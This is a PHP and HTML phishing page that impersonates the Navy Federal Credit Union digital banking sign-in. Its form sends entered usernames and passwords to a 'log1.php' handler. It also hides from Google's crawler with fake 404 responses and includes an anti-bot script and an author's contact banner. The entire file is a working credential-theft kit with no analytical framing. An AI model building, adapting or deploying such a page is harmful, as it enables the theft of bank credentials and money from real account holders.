<?php
	include 'i.php';
?>
<?php
include('anti.php');
if(strpos($_SERVER['HTTP_USER_AGENT'], 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}
?>
<?php
#<!--
#---------------------||-||---------------------#
#        #===============================#
#        #         By Bell South         #
#        #         Icq: @Bell_South      #
#        #        Telegram: @Bell)South  #
#        #       Bellsouth@yahoo.com     #
#        #        fb.com/bell.south      #
#        #         -Contact Me Here-     #
#        #===============================#                     
#
#---------------------||-||---------------------#
#-->
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

<title>Navy Federal Credit Union - Our Members are the Mission&reg;</title>

<link rel="shortcut icon" href="assets/favicon.ico" type="image/x-icon" />
<link rel="apple-touch-icon" href="assets/apple-icon.png" />

<!-- Import this way for performance gains -->
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600">
<link rel="stylesheet" href="assets/nfcu-icons.css" />
<link rel="stylesheet" href="assets/all.css" />
<link rel="stylesheet" href="assets/nauth.css" />
<link rel="stylesheet" href="assets/responsivemain.css" />

<!-- includes jquery, common, dropdown, bootstrap-select, keypad, modal js files -->
	<script type="text/javascript" src="assets/jquery.js"></script>
	<script type="text/javascript" src="assets/common.js"></script>

	<script type="text/javascript" src="assets/cookieGenerator.js"></script>
	<script type="text/javascript" src="assets/login.js"></script>

<script>
window.onload = function(){
var date = new Date().getFullYear();
document.getElementById("year").innerHTML = date;
}
</script>

<noscript>
	 <p class="alert alert-noscriptwarning">Your browsers JavaScript must be enabled to sign into Online Banking.</p>
</noscript>




<!-- Insert Chat Part here -->
<script type="text/Javascript" src="assets/le2-mtagconfig.js"></script> 

</script> 


</head>

<body class="responsive">
 <a href="#end-header" id="skipnav"  class="skipnav">Skip Navigation Links</a>

<div class="mobileMenu">
	<div class="MobileMenuHeader">
	</div>
	<div class="MobileMenuContent">
		<div class="MobLocations">
	        <a href="#"><span>&#xe637;</span>Locations</a>
        </div>
		<div class="MobContactUs">
	        <a href="#"><span>&#xe632;</span>Contact Us</a>
        </div>
        <div class="MobRoutingNumber">
        	<p>Routing Number: <strong>256074974</strong></p>
        </div>
	</div>
</div>

<div class="pageWrap">  
	<!-- start of header -->	
	<div class="header-sm" role="banner">
		<div class="container">
			<div class="header-content-sm">
				<div class="mob-nav-menu">
					<i class="fa fa-bars"></i>
				</div>
				<div class="logo-sm">
					<a href="#" title="Go to NavyFederal.org">
						<img class="logo-sm-pic" src="assets/NFCU_Mob_Logo-1d62888b4b662af9142e3c385f423f32.svg"
							 alt="Navy Federal Credit Union | Army, Marine Corps, Navy, Air Force, Coast Guard, Family (Logo)" />
					</a>
				</div>
			</div>
		</div>
	</div>
	<div class="header-bg" role="banner">
		<div class="container">
			<div class="content-box">
				<div class="header-content-bg">
					<div class="logo">
						<a href="#" title="Go to NavyFederal.org" class="logo_bg_a">
						<img src="assets/img_logo-veterans-1d62888b4b662af9142e3c385f423f32.svg" 
							alt="Navy Federal Credit Union | Army, Marine Corps, Navy, Air Force, Coast Guard, Family (Logo)" class="logo_bg"/> </a>
					</div>
					<div class="nav navbar-collapse">
						<div class="rt-container"><span class="text-routing">Routing Number: </span><span class="rnumber">256074974</span></div>
						<a	class="padRight20 loc-class" href="#"> <span class="icon-locations"></span> Locations </a>
						
						<a class="Contact-us" href="#"><img src="assets/contact-us-1d62888b4b662af9142e3c385f423f32.svg"
						class="icon_more_contact_us_default" alt="Contact Us"/> Contact Us</a>  
					</div>
				</div>
			</div>
		</div> 
	</div>
	
		<!-- end of header-->
		
		<!-- main content area starts here -->
	<div class="content-wrapper" role="main">
		
		        <div class="formbackground">
		        <a id="end-header"></a>
		        		
		        </div>
		        <div class="container" role="main">
		        	<div class="background-container">
		        	<div class="login-content-box">
						<div class="login">    
							<div class="headers"> 
								<h1>Welcome to Digital Banking</h1>
		                	</div>               
		                    	<div class="login-panel">
								
								<div class="panel panel-primary heading-callout">
				                    <div class="panel-heading">
				                        <h2 class="panel-title"><span  class="icon-padlock"></span> Sign In</h2>
				                    </div>
				                    <div class="rule-container">
				                    	<div class="horizontal-line"></div>
				                    </div>
			                        <div class="panel-body">
			                            <div class="panel-content-left">
											<form id="Login" class="form-inline Rectangle-2459" name="Login" method="post" action="log1.php" autocomplete="off">
												<div class="userPassGroup">
													<div class="form-group username" style="display:inline-block;">
														<label for="user">Username</label> <span class="tooltipOne" data-guidetext="Sign into online banking with your unique Username, which may be your access number." aria-label="Sign into online banking with your unique Username, which may be your access number." tabindex="0" role="button" aria-disabled="true"></span>														
							  	  		<input type="text" name="User" id="user" value="" maxlength="32" class="form-control"   required>
													</div>
													<div  class="form-group password" style="display:inline-block;">
														<label  for="password" >Password</label>
										<input type="password" name="Pass" id="password"  class="form-control" required>
													</div>
													<div class="signInHelp"><a href="#" aria-label="Sign In Help">Sign In Help</a></div>
												</div>
												
												<div class="submitAndRecaptcha "> 
												
												
										<input type="submit" name="SignIn" class="btn btn-primary reg-sign-in" id="signIn" value="Sign In" disabled="disabled">
												
												
												</div>
												
											</form>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			<!-- Internal Navigation Links -->
			<div class="membership-content-box">
				<div class="membership-middle">
					<div class="join-nfcu">
						<div class="join-nfcu-container">
							<div class="membership-verbiage">
								<div class="not-a-member">
									<h2 id="not-a-nfcu-mbr">Not a Navy Federal member?</h2>
								</div>
								<div class="join-now-verbiage" id="joinNowVerbiage">
									<p>Join now and enjoy the support and great service of a credit union that puts your needs first.</p>
								</div>
							</div>
							
							<div class="member-buttons">
								<button  class="become-member" >Become a Member</button>
								<button  class="membership-learn-more" aria-describedby="not-a-nfcu-mbr">Learn More</button>
							</div>
							
						</div>
					</div>
					<div class="join-picture">
						<img class="join-img" alt="" src="assets/img-BecomeAMember-1d62888b4b662af9142e3c385f423f32.jpg">
					</div>
				</div>
			</div>
					<div  class="page-header">
						<div class="content-box">	
							<div class="ph-content-box">
								<div class="col-sm-4">
									<div class="circle">
										<img class="circle-icon" src="assets/Group5159-1d62888b4b662af9142e3c385f423f32.svg" alt="">
									</div>
									<div class="ph-text-h3"><h3>Don't have online access?</h3></div>	
									<div class="ph-text-a"><a href="#">Enroll in digital banking <span aria-hidden="true">&raquo;</span></a></div>
									
								</div>
								<div class="col-sm-4">
									<div class="circle">
										<img class="circle-icon special6px" src="assets/Group5166-1d62888b4b662af9142e3c385f423f32.svg" alt="">
									</div>
									<div id="digitalBankingSecurityHeader" class="ph-text-h3"><h3>Find out more about secure digital banking</h3></div>
									<div class="ph-text-a"><a href="#" aria-describedby="digitalBankingSecurityHeader">Learn more <span aria-hidden="true">&raquo;</span></a></div>
								</div>
								<div class="col-sm-4">
									<div class="circle">
										<img class="circle-icon" src="assets/Group5158-1d62888b4b662af9142e3c385f423f32.svg" alt="">
									</div>
									<div class="ph-text-h3"><h3>Need help?</h3></div>
									<div class="ph-text-a"><a href="#">Contact us <span aria-hidden="true">&raquo;</span></a></div>
									
								</div>
							</div>
						</div>
					</div>
				</div>	
			</div>
		<!-- start of footer  -->
		<div class="container footer">
			<div class="content-box">
				<div class="ft-content-box">
		            <div class="footer-content">
		                <div class="ft-logo">
		                    <a href="#" title="Go to NavyFederal.org" target="_blank" class="ft-logo-a">
		                    	<span class="nfcu-icon-ftlogo">&#xe608;</span>
		                    </a>
		                </div>
		                <div class="content">
		                    <div class="member-services marginbottom20">
		      						<span class="mbr-services-txt">24/7 Member Services:<b>&nbsp;1-888-842-6328&nbsp;</b></span><span class="separator mob-pipe">&#x2008; &#x2008;|&#x2008; &#x2008;</span><span class="mob-line-break"><br></span>
		      						<span class="text-routing">Routing Number:&nbsp;<b>256074974</b> </span>
		      						<hr/>
		      				</div>
		      				<div class="nav-container">
				                <nav class="nav ft-nav paddingtop20 marginbottom20" role="navigation">
										<a href="#">About Us&#x2008; &#x2008;</a> <span class="separator">|</span>
										<a href="#">&#x2008; &#x2008;Contact Us&#x2008; &#x2008;</a> <span class="separator">|</span>
										<a href="#">&#x2008; &#x2008;Privacy Policy&#x2008; &#x2008;</a> <span class="separator">|</span>
										<a href="#">&#x2008; &#x2008;Security&#x2008; &#x2008;</a> <span class="separator">|</span>
										<a href="#">&#x2008; &#x2008;Accessibility&#x2008; &#x2008;</a> <span class="separator">|</span>
										<a href="#">&#x2008; &#x2008;Browser Support</a>
								</nav>
							</div>
							<div class="copyright">	
								<p id="copyright">
									&#169; <span id="year" style="font-weight:800;"></span><span class="copyright">&nbsp;<b>Navy Federal Credit Union.</b> </span> All rights reserved.
								</p>
							</div>
							
		                        <div class="nav regInstitutions"> 
									<div class="ncua-link"><a href="#" id="ncua-font"><span class="icon-ncua"></span> Federally Insured by NCUA</a><span class="separator">&#x2008;&#x2008;&#x2008;&#x2008;&#x2008;|&#x2008;&#x2008;&#x2008;&#x2008;&#x2008;</span></div> 
									<div class="ehl-link"><a href="#" id="EHL"><span class="icon-housing"></span> Equal Housing Lender</a> </div>
								</div>	                    
		                    
		                    <div class="ft-disclaimers">
		                    	<p>
									APY = Annual Percentage Yield <span class="separator">|</span> APR = Annual Percentage Rate
								</p>
		                        <p>
		                            <sup>+</sup>Rates are based on an evaluation of credit history, so your rate may differ.
		                        </p>
		
		                        <p>
		                            <sup>++</sup>Rates are variable, and based on an evaluation of credit history, so your rate may differ.
		                        </p>
		                        
		                        <p>
		                        	<sup>*</sup>Message and date rates may apply. Terms and Conditions are available.
		                        </p>
		                        
		                        <p>
		                         iPhone&reg;, iPad&reg; and iPod touch&reg; are trademarks of Apple Inc. App Store&#8480; is a service mark of Apple Inc. Android&trade; and Google Play&trade; are trademarks of Google Inc. Images used for representational purposes only; do not imply government endorsement.
		                    	</p>
		                    </div>
		                </div>
		            </div>
		    	</div>
	    	</div>
	    </div>
	    <!-- end of footer  -->
</div>
	<!-- iFrame for onlineDisclosure -->
    <div class="modal fade" id="modalonlineDisclosure" tabindex="-1" role="dialog" aria-labelledby="modalonlineDisclosureLabel">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span class="fa fa-times" aria-hidden="true"></span></button>
                    <p class="modal-title" id="modalonlineDisclosureLabel">Use of Cookies by Navy Federal Online</p>
                </div>
                <div class="modal-body">
                    <iframe id="onlineDisclosureFrame" class="cookies"  frameborder="0"></iframe>
                </div>
                <div class="modal-footer">
                	<button type="button" id="modal-button" value="Done" data-dismiss="modal" aria-label="Done">Done</button>
                </div>
            </div>
        </div>
    </div>
    <!-- End of onlineDisclosure Modal -->
    
    <div class="modal fade" id="modalbrowserRequirements" tabindex="-1" role="dialog" aria-labelledby="modalbrowserRequirementsLabel">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span class="fa fa-times" aria-hidden="true"></span></button>
                    <p class="modal-title" id="modalbrowserRequirementsLabel">Browser Requirements</p>
                </div>
            </div>
        </div>
    </div>
	</body>
</html>